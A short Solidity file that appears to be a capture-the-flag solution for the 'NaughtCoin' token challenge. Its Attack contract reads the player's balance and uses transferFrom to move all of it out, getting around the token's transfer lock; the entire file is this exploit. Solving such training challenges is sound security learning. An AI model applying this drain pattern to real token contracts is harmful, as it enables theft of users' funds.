
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";


interface NaughtCoin {
    function player() external view returns(address);
}

interface iERC20{
    function balanceOf(address account) external view returns(uint256);
    function approve(address sender, uint256 amount) external  returns(bool);
    function transferFrom(address sender, address recepient, uint256 amount) external  returns(bool);

}

contract Attack {
    function attack(iERC20 token) external {
        address player = NaughtCoin(address(token)).player();
        uint256 balance = token.balanceOf(player);
        token.transferFrom(player,address(this),balance);
    }
}
